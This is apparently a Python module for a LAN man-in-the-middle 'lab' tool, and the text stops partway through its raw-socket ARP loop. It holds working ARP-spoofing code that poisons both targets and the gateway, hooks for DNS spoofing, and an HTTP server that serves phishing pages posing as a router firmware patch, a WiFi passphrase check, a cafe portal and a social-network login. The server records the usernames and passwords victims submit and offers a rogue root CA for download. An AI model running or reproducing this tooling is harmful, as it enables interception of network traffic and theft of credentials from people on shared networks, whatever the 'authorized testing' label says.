#!/usr/bin/env python3
"""
LAN MITM Lab — ARP spoof + optional DNS spoof (authorized testing only).

Backends (auto-detect):
  ARP: arpspoof | bettercap | pure-Python raw socket fallback
  DNS: dnsmasq | pure-Python UDP DNS responder fallback

Safety:
  - Private IPv4 ranges only
  - Confirmations are handled by the UI
  - stop() always restores IP forward and best-effort ARP cleanup
"""

from __future__ import annotations

import ipaddress
import os
import random
import re
import select
import shutil
import socket
import struct
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Sequence, Tuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs


LogFn = Callable[[str], None]


def _run(cmd: Sequence[str], timeout: int = 15) -> subprocess.CompletedProcess:
    return subprocess.run(
        list(cmd),
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _run_ok(cmd: Sequence[str], timeout: int = 15) -> Tuple[bool, str]:
    try:
        p = _run(cmd, timeout=timeout)
        out = ((p.stdout or "") + (p.stderr or "")).strip()
        return p.returncode == 0, out
    except FileNotFoundError:
        return False, "not found: {c}".format(c=cmd[0])
    except subprocess.TimeoutExpired:
        return False, "timeout"
    except Exception as exc:
        return False, str(exc)


def which(name: str) -> Optional[str]:
    return shutil.which(name)


def is_private_ipv4(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(str(ip).strip())
    except ValueError:
        return False
    return isinstance(addr, ipaddress.IPv4Address) and (
        addr.is_private or addr.is_link_local
    )


def is_valid_ipv4(ip: str) -> bool:
    try:
        return isinstance(ipaddress.ip_address(str(ip).strip()), ipaddress.IPv4Address)
    except ValueError:
        return False


def detect_tools() -> Dict[str, Optional[str]]:
    return {
        "ip": which("ip"),
        "sysctl": which("sysctl"),
        "iptables": which("iptables"),
        "arpspoof": which("arpspoof"),
        "ettercap": which("ettercap"),
        "bettercap": which("bettercap"),
        "dnsmasq": which("dnsmasq"),
        "nmap": which("nmap"),
        "tcpdump": which("tcpdump"),
        "arp": which("arp"),
    }


def install_hints() -> List[str]:
    return [
        "Debian/Kali: sudo apt install dsniff iptables dnsmasq nmap iproute2",
        "Optional: sudo apt install bettercap ettercap-text-only",
        "Termux (limited): pkg install iproute2 nmap  # ARP raw may need full root env",
    ]


@dataclass
class HostInfo:
    ip: str
    mac: str = ""
    name: str = ""


@dataclass
class MitmSession:
    iface: str = ""
    gateway_ip: str = ""
    gateway_mac: str = ""
    targets: List[str] = field(default_factory=list)
    attacker_ip: str = ""
    attacker_mac: str = ""
    dns_enabled: bool = False
    dns_map: Dict[str, str] = field(default_factory=dict)
    dns_catch_all: str = ""
    dns_upstream: str = "8.8.8.8"
    portal_enabled: bool = False
    portal_template: str = "socialnet"
    arp_backend: str = ""
    dns_backend: str = ""
    started_at: float = 0.0
    running: bool = False
    notes: List[str] = field(default_factory=list)


class MitmHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        try:
            self.server.lab._say("[http-portal] {0}".format(format % args))
        except Exception:
            pass

    def do_GET(self):
        lab = self.server.lab
        template = self.server.template
        path = self.path.split("?")[0].rstrip("/").lower()

        if "ca.crt" in path or "cert" in path:
            ca_crt_path = os.path.join(os.path.dirname(__file__), "../data/ca.crt")
            if os.path.exists(ca_crt_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/x-x509-ca-cert")
                self.send_header("Content-Disposition", "attachment; filename=mitm-lab-ca.crt")
                self.end_headers()
                with open(ca_crt_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"CA Certificate not generated yet.")
        elif not path or path == "" or "login" in path or "redirect" in path:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(lab.get_template_html(template).encode("utf-8"))
        elif "success" in path:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(lab.get_success_html().encode("utf-8"))
        else:
            self.send_response(302)
            self.send_header("Location", "http://{0}/".format(self.server.attacker_ip))
            self.end_headers()

    def do_POST(self):
        lab = self.server.lab
        template = self.server.template
        cl = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(cl).decode("utf-8", "ignore")
        params = parse_qs(body)

        username = params.get("username", [""])[0].strip()
        password = params.get("password", [""])[0].strip()

        if not username:
            username = params.get("email", [""])[0].strip() or params.get("user", [""])[0].strip() or "N/A"

        if password:
            cred_msg = "Captured login from {src} ({template}): User={u} Pass={p}".format(
                src=self.client_address[0], template=template, u=username, p=password
            )
            lab._say("[!] [ok] CAPTURED VIA PORTAL: {msg}".format(msg=cred_msg))

            with lab._lock:
                lab._captured_creds.append({
                    "src": self.client_address[0],
                    "host": "Local Portal ({0})".format(template),
                    "user": username,
                    "pass": password,
                    "time": time.time()
                })

            if lab.db:
                try:
                    lab.db.add_credential(
                        bssid=self.client_address[0],
                        essid="Portal ({0})".format(template),
                        pin=None,
                        psk="User: {u} | Pass: {p}".format(u=username, p=password),
                        method="MITM_Portal_{0}".format(template.upper())
                    )
                    lab.db.log(
                        "capture",
                        "lan_mitm",
                        "Credential captured from {src} via portal ({t})".format(
                            src=self.client_address[0], t=template
                        ),
                        "ok"
                    )
                except Exception as e:
                    lab._say("[!] DB save error: {e}".format(e=e))

            self.send_response(302)
            self.send_header("Location", "http://{0}/success".format(self.server.attacker_ip))
            self.end_headers()
        else:
            self.send_response(302)
            self.send_header("Location", "http://{0}/".format(self.server.attacker_ip))
            self.end_headers()


class LanMitmLab:
    """Orchestrates ARP spoof (+ optional DNS spoof) for lab use."""

    def __init__(self, log: Optional[LogFn] = None, db=None):
        self.log = log or (lambda m: None)
        self.db = db
        self.tools = detect_tools()
        self.session = MitmSession()
        self._stop = threading.Event()
        self._threads: List[threading.Thread] = []
        self._procs: List[subprocess.Popen] = []
        self._orig_forward: Optional[str] = None
        self._lock = threading.Lock()
        self._captured_creds: List[Dict] = []
        self._spoof_packets_sent = 0

    def get_captured_creds(self) -> List[Dict]:
        with self._lock:
            return list(self._captured_creds)

    def get_spoof_packets_count(self) -> int:
        with self._lock:
            return self._spoof_packets_sent

    def get_template_html(self, template: str) -> str:
        template = str(template).lower().strip()

        # 1. Router Admin Portal Template
        if template == "router":
            return """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Admin Portal - Firmware Patch Required</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: #ffffff; border-radius: 12px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05), 0 2px 10px rgba(0, 0, 0, 0.03); max-width: 480px; width: 90%; overflow: hidden; border: 1px solid #e2e8f0; }
        .header { background-color: #1e3a8a; padding: 24px; text-align: center; color: white; }
        .header h2 { margin: 0; font-size: 20px; font-weight: 600; }
        .content { padding: 32px 24px; }
        .warning-box { background-color: #fffbeb; border: 1px solid #fef3c7; border-left: 4px solid #d97706; padding: 16px; border-radius: 6px; margin-bottom: 24px; display: flex; align-items: flex-start; }
        .warning-icon { margin-right: 12px; fill: #d97706; flex-shrink: 0; }
        .warning-text { font-size: 14px; line-height: 1.5; color: #92400e; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #475569; }
        .form-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #cbd5e1; font-size: 15px; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; outline: none; }
        .form-group input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
        .btn { width: 100%; padding: 12px; background-color: #2563eb; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; margin-top: 10px; }
        .btn:hover { background-color: #1d4ed8; }
        .footer { text-align: center; font-size: 12px; color: #94a3b8; margin-top: 32px; border-top: 1px solid #f1f5f9; padding-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h2>Gateway Administration Portal</h2>
        </div>
        <div class="content">
            <div class="warning-box">
                <svg class="warning-icon" width="20" height="20" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                <div class="warning-text">
                    <strong>CRITICAL UPDATE:</strong> A security patch (v2.8.14) is currently installing to protect your connection against active WPA exploits. Enter your Router Administrator Password to authorize the setup and restore service.
                </div>
            </div>
            <form action="/login" method="POST">
                <div class="form-group">
                    <label for="username">Administrator Username</label>
                    <input type="text" id="username" name="username" value="admin" required readonly style="background-color: #f8fafc; color: #64748b; cursor: not-allowed;">
                </div>
                <div class="form-group">
                    <label for="password">Administrator Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter router password" required autofocus>
                </div>
                <button type="submit" class="btn">Apply Patch & Authenticate</button>
            </form>
            <div class="footer">
                Secured by Router Gateway Systems &copy; 2026<br><a href="/ca.crt" style="color: #2563eb; text-decoration: underline; font-size: 11px; display: inline-block; margin-top: 8px;">[Lab] Download Testing Root CA</a>
            </div>
        </div>
    </div>
</body>
</html>"""

        # 2. Enterprise Wifi Portal Template
        elif template == "wifi":
            return """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Secure Sign-In Gateway</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f8fafc; color: #0f172a; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: #ffffff; border-radius: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04); max-width: 440px; width: 90%; padding: 40px 30px; text-align: center; border: 1px solid #f1f5f9; box-sizing: border-box; }
        .wifi-icon { display: inline-flex; align-items: center; justify-content: center; width: 72px; height: 72px; background-color: #eff6ff; border-radius: 50%; margin-bottom: 24px; animation: pulse 2s infinite; }
        .wifi-icon svg { fill: #3b82f6; }
        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); } 70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); } }
        h1 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; color: #1e293b; }
        p { font-size: 14px; color: #64748b; margin: 0 0 32px 0; line-height: 1.5; }
        .form-group { margin-bottom: 24px; text-align: left; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; }
        .form-group input { width: 100%; padding: 12px 16px; border-radius: 8px; border: 1.5px solid #e2e8f0; font-size: 15px; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; outline: none; }
        .form-group input:focus { border-color: #3b82f6; box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.12); }
        .btn { width: 100%; padding: 14px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15); }
        .btn:hover { background-color: #2563eb; }
        .footer { font-size: 12px; color: #94a3b8; margin-top: 32px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="wifi-icon">
            <svg width="36" height="36" viewBox="0 0 24 24">
                <path d="M12 21l-1.42-1.42A27.17 27.17 0 0 0 12 3a27.17 27.17 0 0 0 1.42 16.58L12 21zm-6-6l1.42-1.42c1.78.85 3.1 2.37 3.58 4.22L12 19a15.2 15.2 0 0 1-6-4zm12 0l-1.42-1.42a15.2 15.2 0 0 1 3.58 4.22L12 19c2.37.03 4.54-1.44 6-4z"/>
            </svg>
        </div>
        <h1>Network Verification</h1>
        <p>The system is validating local WiFi connections. Please authenticate using your secure wireless passphrase to continue browsing.</p>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="password">WiFi Passphrase (WPA2/WPA3)</label>
                <input type="password" id="password" name="password" placeholder="Enter wireless password" required autofocus minlength="8">
            </div>
            <button type="submit" class="btn">Connect & Verify</button>
        </form>
        <div class="footer">
            Secure WiFi Hotspot verification Gateway<br><a href="/ca.crt" style="color: #3b82f6; text-decoration: underline; font-size: 11px; display: inline-block; margin-top: 8px;">[Lab] Download Testing Root CA</a>
        </div>
    </div>
</body>
</html>"""

        # 3. Ad-supported Cafe Portal Template
        elif template == "ad_portal" or template == "ad":
            return """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cafe Premium Wi-Fi - Sponsored Connection</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f1f5f9; color: #1e293b; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: #ffffff; border-radius: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); max-width: 460px; width: 90%; overflow: hidden; border: 1px solid #e2e8f0; box-sizing: border-box; }
        .header { background-color: #78350f; padding: 20px; text-align: center; color: white; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .header h2 { margin: 0; font-size: 18px; font-weight: 600; }
        .content { padding: 24px; text-align: center; }
        .ad-container { background-color: #fafaf9; border: 2px dashed #d6d3d1; padding: 20px; border-radius: 12px; margin-bottom: 24px; text-align: center; position: relative; }
        .ad-tag { position: absolute; top: 8px; right: 12px; background-color: #e7e5e4; color: #78716c; font-size: 9px; font-weight: 700; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
        .ad-title { font-size: 16px; font-weight: 700; color: #44403c; margin: 12px 0 6px 0; }
        .ad-desc { font-size: 13px; color: #78716c; line-height: 1.4; margin: 0; }
        .coffee-icon { fill: #78350f; margin-bottom: 10px; }
        .timer-box { font-size: 14px; font-weight: 600; color: #b45309; background-color: #fef3c7; border: 1px solid #fde68a; padding: 10px; border-radius: 8px; margin-bottom: 24px; }
        .btn { width: 100%; padding: 14px; background-color: #a8a29e; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: not-allowed; transition: background-color 0.3s, transform 0.1s; }
        .btn:active:not([disabled]) { transform: scale(0.98); }
        .footer { font-size: 12px; color: #a8a29e; margin-top: 24px; border-top: 1px solid #f5f5f4; padding-top: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                <path d="M2 21h18v-2H2v2zM20 8h-2V5h2v3zM4 19h12v-4H4v4zm14-11h2c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-2v5zm-2-5H2v10c0 2.21 1.79 4 4 4h8c2.21 0 4-1.79 4-4V3zm-2 10H4V5h10v8z"/>
            </svg>
            <h2>Cafe Net Premium Wi-Fi</h2>
        </div>
        <div class="content">
            <div class="ad-container">
                <span class="ad-tag">Sponsored Ad</span>
                <svg class="coffee-icon" width="48" height="48" viewBox="0 0 24 24">
                    <path d="M2 21h18v-2H2v2zM20 8h-2V5h2v3zM4 19h12v-4H4v4zm14-11h2c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-2v5zm-2-5H2v10c0 2.21 1.79 4 4 4h8c2.21 0 4-1.79 4-4V3zm-2 10H4V5h10v8z"/>
                </svg>
                <div class="ad-title">Upgrade to CafeNet Premium!</div>
                <p class="ad-desc">Tired of waiting? Get 100Mbps unlimited high-speed connection with our premium membership card. Ask the barista for details!</p>
            </div>

            <div class="timer-box" id="timer-status">
                Sponsored Ad. Connection will unlock in <span id="countdown" style="font-size: 16px; font-weight: 800;">20</span> seconds...
            </div>

            <form action="/login" method="POST">
                <input type="hidden" name="username" value="cafe_user">
                <input type="hidden" name="password" value="Ad_Watched_Successfully">
                <button type="submit" class="btn" id="unlock-btn" disabled>Unlock Internet Connection</button>
            </form>

            <div class="footer">
                CafeNet Spot &copy; 2026<br><a href="/ca.crt" style="color: #78350f; text-decoration: underline; font-size: 11px; display: inline-block; margin-top: 8px;">[Lab] Download Testing Root CA</a>
            </div>
        </div>
    </div>

    <script>
        let timeLeft = 20;
        const countdownEl = document.getElementById('countdown');
        const timerStatusEl = document.getElementById('timer-status');
        const unlockBtn = document.getElementById('unlock-btn');

        const timer = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(timer);
                timerStatusEl.innerHTML = "Ad finished! You can now access the internet.";
                timerStatusEl.style.backgroundColor = "#dcfce7";
                timerStatusEl.style.borderColor = "#bbf7d0";
                timerStatusEl.style.color = "#166534";

                unlockBtn.removeAttribute('disabled');
                unlockBtn.style.backgroundColor = '#10b981';
                unlockBtn.style.cursor = 'pointer';
            } else {
                countdownEl.innerText = timeLeft;
            }
        }, 1000);
    </script>
</body>
</html>"""

        # 4. Default SocialNet Template
        else:
            return """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SocialNet Secure Gateway Sign-In</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); color: #f8fafc; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: rgba(30, 41, 59, 0.7); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.08); padding: 48px 36px; max-width: 440px; width: 90%; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3); text-align: center; box-sizing: border-box; }
        .logo { display: inline-flex; align-items: center; justify-content: center; width: 64px; height: 64px; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); border-radius: 16px; margin-bottom: 28px; box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3); }
        .logo svg { fill: white; }
        h1 { font-size: 26px; font-weight: 800; margin: 0 0 10px 0; background: linear-gradient(to right, #ffffff, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p { font-size: 14px; color: #94a3b8; margin: 0 0 36px 0; line-height: 1.6; }
        .form-group { margin-bottom: 24px; text-align: left; }
        .form-group label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 8px; color: #cbd5e1; }
        .form-group input { width: 100%; padding: 14px 16px; border-radius: 10px; border: 1.5px solid rgba(255, 255, 255, 0.1); background-color: rgba(15, 23, 42, 0.6); color: white; font-size: 15px; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; outline: none; }
        .form-group input:focus { border-color: #6366f1; box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15); }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s, transform 0.2s; box-shadow: 0 4px 15px rgba(99, 102, 241, 0.25); }
        .btn:hover { transform: translateY(-1px); }
        .btn:active { transform: translateY(0); }
        .footer { font-size: 12px; color: #64748b; margin-top: 36px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg width="32" height="32" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 16H11v-6H9v-2h3V16zm1-8h-2V6h2v2z"/>
            </svg>
        </div>
        <h1>SocialNet Connect</h1>
        <p>Authenticate your local device securely. Sign in using your SocialNet credentials to activate instant broadband access.</p>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" placeholder="name@example.com" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter account password" required>
            </div>
            <button type="submit" class="btn">Authenticate Connection</button>
        </form>
        <div class="footer">
            Broadband Secure Authentication Gateway &bull; SocialNet Ltd.<br><a href="/ca.crt" style="color: #6366f1; text-decoration: underline; font-size: 11px; display: inline-block; margin-top: 8px;">[Lab] Download Testing Root CA</a>
        </div>
    </div>
</body>
</html>"""

    def get_success_html(self) -> str:
        return """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Successful</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f8fafc; color: #0f172a; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: #ffffff; border-radius: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04); max-width: 440px; width: 90%; padding: 40px 30px; text-align: center; border: 1px solid #f1f5f9; box-sizing: border-box; }
        .success-icon { display: inline-flex; align-items: center; justify-content: center; width: 80px; height: 80px; background-color: #ecfdf5; border-radius: 50%; margin-bottom: 24px; }
        .success-icon svg { fill: #10b981; }
        h1 { font-size: 24px; font-weight: 700; margin: 0 0 12px 0; color: #1e293b; }
        p { font-size: 15px; color: #64748b; margin: 0 0 32px 0; line-height: 1.6; }
        .progress-bar-container { background-color: #e2e8f0; border-radius: 100px; height: 6px; width: 100%; overflow: hidden; margin-bottom: 12px; }
        .progress-bar { background-color: #10b981; height: 100%; width: 0; border-radius: 100px; animation: fillProgress 4s forwards linear; }
        @keyframes fillProgress { 0% { width: 0; } 100% { width: 100%; } }
        .redirect-text { font-size: 12px; color: #94a3b8; }
    </style>
</head>
<body>
    <div class="card">
        <div class="success-icon">
            <svg width="40" height="40" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
        </div>
        <h1>Authentication Successful</h1>
        <p>Your local device credentials have been validated successfully. Redirecting you safely to the active internet. please wait...</p>
        <div class="progress-bar-container">
            <div class="progress-bar"></div>
        </div>
        <div class="redirect-text">Restoring active network connection...</div>
    </div>
</body>
</html>"""

    def generate_ca_certificate(self) -> bool:
        """Generates a local testing self-signed CA certificate using openssl if not exists."""
        ca_key = os.path.join(os.path.dirname(__file__), "../data/ca.key")
        ca_crt = os.path.join(os.path.dirname(__file__), "../data/ca.crt")

        if os.path.exists(ca_key) and os.path.exists(ca_crt):
            return True

        os.makedirs(os.path.dirname(ca_key), exist_ok=True)

        cmd = [
            "openssl", "req", "-x509", "-new", "-nodes",
            "-keyout", ca_key, "-sha256", "-days", "365",
            "-out", ca_crt,
            "-subj", "/CN=WPS_Toolkit_MITM_Lab_Root_CA/O=MITM_Lab/C=MA"
        ]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if res.returncode == 0:
                self._say("[*] Successfully generated local testing Root CA certificate")
                return True
            else:
                self._say("[!] Failed to generate Root CA: {0}".format(res.stderr))
                return False
        except Exception as e:
            self._say("[!] Error generating CA certificate: {0}".format(e))
            return False

    def _say(self, msg: str) -> None:
        try:
            self.log(msg)
        except Exception:
            pass

    # ── Discovery ─────────────────────────────────────────

    def get_default_iface(self) -> str:
        ok, out = _run_ok(["ip", "route", "show", "default"], timeout=5)
        if ok:
            m = re.search(r"\bdev\s+(\S+)", out)
            if m:
                return m.group(1)
        return "wlan0"

    def get_gateway_ip(self) -> str:
        ok, out = _run_ok(["ip", "route", "show", "default"], timeout=5)
        if ok:
            m = re.search(r"default via ([0-9.]+)", out)
            if m and is_valid_ipv4(m.group(1)):
                return m.group(1)
        return "192.168.1.1"

    def get_local_ip(self, iface: Optional[str] = None) -> str:
        iface = iface or self.get_default_iface()
        ok, out = _run_ok(["ip", "-4", "-o", "addr", "show", "dev", iface], timeout=5)
        if ok:
            m = re.search(r"inet\s+([0-9.]+)", out)
            if m:
                return m.group(1)
        ok, out = _run_ok(["hostname", "-I"], timeout=5)
        if ok and out.split():
            return out.split()[0]
        return "0.0.0.0"

    def get_iface_mac(self, iface: str) -> str:
        path = "/sys/class/net/{i}/address".format(i=iface)
        try:
            with open(path, "r", encoding="utf-8") as handle:
                return handle.read().strip().lower()
        except OSError:
            pass
        ok, out = _run_ok(["ip", "link", "show", iface], timeout=5)
        if ok:
            m = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", out)
            if m:
                return m.group(1).lower()
        return ""

    def get_mac(self, ip: str) -> str:
        # ip neigh
        ok, out = _run_ok(["ip", "neigh", "show", ip], timeout=5)
        if ok:
            m = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", out)
            if m:
                return m.group(1).lower()
        # ping then retry
        _run_ok(["ping", "-c", "1", "-W", "1", ip], timeout=5)
        ok, out = _run_ok(["ip", "neigh", "show", ip], timeout=5)
        if ok:
            m = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", out)
            if m:
                return m.group(1).lower()
        return ""

    def get_subnet_cidr(self, iface: Optional[str] = None) -> str:
        iface = iface or self.get_default_iface()
        ok, out = _run_ok(["ip", "-4", "-o", "addr", "show", "dev", iface], timeout=5)
        if ok:
            m = re.search(r"inet\s+([0-9.]+)/(\d+)", out)
            if m:
                net = ipaddress.ip_network(
                    "{ip}/{p}".format(ip=m.group(1), p=m.group(2)),
                    strict=False,
                )
                return str(net)
        ip = self.get_local_ip(iface)
        parts = ip.split(".")
        if len(parts) == 4:
            return "{a}.{b}.{c}.0/24".format(a=parts[0], b=parts[1], c=parts[2])
        return "192.168.1.0/24"

    def list_neighbors(self) -> List[HostInfo]:
        hosts: List[HostInfo] = []
        ok, out = _run_ok(["ip", "neigh", "show"], timeout=8)
        if ok:
            for line in out.splitlines():
                m = re.match(
                    r"([0-9.]+)\s+dev\s+\S+\s+lladdr\s+([0-9a-fA-F:]{17}).*",
                    line,
                )
                if not m:
                    continue
                ip, mac = m.group(1), m.group(2).lower()
                if is_private_ipv4(ip):
                    hosts.append(HostInfo(ip=ip, mac=mac))
        # optional nmap ping scan enrichment
        if which("nmap"):
            cidr = self.get_subnet_cidr()
            self._say("[*] nmap -sn {c} ...".format(c=cidr))
            try:
                p = _run(["nmap", "-sn", "-T4", cidr], timeout=90)
                cur_ip = ""
                for line in (p.stdout or "").splitlines():
                    m = re.match(r"Nmap scan report for (.+)", line)
                    if m:
                        token = m.group(1).strip()
                        # "name (ip)" or "ip"
                        m2 = re.search(r"\(([0-9.]+)\)", token)
                        if m2:
                            cur_ip = m2.group(1)
                            name = token.split("(")[0].strip()
                        elif is_valid_ipv4(token):
                            cur_ip = token
                            name = ""
                        else:
                            cur_ip = ""
                            name = token
                        if cur_ip and is_private_ipv4(cur_ip):
                            mac = self.get_mac(cur_ip)
                            hosts.append(HostInfo(ip=cur_ip, mac=mac, name=name))
            except Exception as exc:
                self._say("[!] nmap failed: {e}".format(e=exc))

        # de-dupe by IP
        uniq: Dict[str, HostInfo] = {}
        for h in hosts:
            prev = uniq.get(h.ip)
            if not prev or (h.mac and not prev.mac) or (h.name and not prev.name):
                uniq[h.ip] = HostInfo(
                    ip=h.ip,
                    mac=h.mac or (prev.mac if prev else ""),
                    name=h.name or (prev.name if prev else ""),
                )
        me = self.get_local_ip()
        gw = self.get_gateway_ip()
        result = [h for h in uniq.values() if h.ip not in (me,)]
        result.sort(key=lambda h: tuple(int(x) for x in h.ip.split(".")))
        # put gateway note
        for h in result:
            if h.ip == gw and not h.name:
                h.name = "gateway?"
        return result

    # ── IP forward / iptables ─────────────────────────────

    def _read_forward(self) -> str:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r", encoding="utf-8") as handle:
                return handle.read().strip()
        except OSError:
            return "0"

    def set_ip_forward(self, enable: bool) -> bool:
        val = "1" if enable else "0"
        # sysctl
        if which("sysctl"):
            ok, out = _run_ok(
                ["sysctl", "-w", "net.ipv4.ip_forward={v}".format(v=val)],
                timeout=5,
            )
            if ok:
                return True
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as handle:
                handle.write(val + "\n")
            return True
        except OSError as exc:
            self._say("[!] Cannot set ip_forward: {e}".format(e=exc))
            return False

    # ── ARP backends ──────────────────────────────────────

    def _mac_bytes(self, mac: str) -> bytes:
        return bytes(int(x, 16) for x in mac.split(":"))

    def _ip_bytes(self, ip: str) -> bytes:
        return socket.inet_aton(ip)

    def _build_arp_packet(
        self,
        sender_mac: str,
        sender_ip: str,
        target_mac: str,
        target_ip: str,
        op: int = 2,
    ) -> bytes:
        """Ethernet + ARP reply/request."""
        smac = self._mac_bytes(sender_mac)
        tmac = (
            self._mac_bytes(target_mac)
            if target_mac and target_mac != "ff:ff:ff:ff:ff:ff"
            else b"\xff\xff\xff\xff\xff\xff"
        )
        eth = tmac + smac + b"\x08\x06"
        arp = struct.pack(
            "!HHBBH6s4s6s4s",
            0x0001,  # hardware Ethernet
            0x0800,  # protocol IP
            6,
            4,
            op,  # 1 req 2 reply
            smac,
            self._ip_bytes(sender_ip),
            tmac if op == 2 else b"\x00\x00\x00\x00\x00\x00",
            self._ip_bytes(target_ip),
        )
        return eth + arp

    def _python_arp_loop(
        self,
        iface: str,
        attacker_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        targets: List[Tuple[str, str]],
    ) -> None:
        """
        targets: list of (ip, mac)
        Tell targets that gateway_ip is at attacker_mac
        Tell gateway that each target_ip is at attacker_mac
        """
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
            sock.bind((iface, 0))
        except PermissionError:
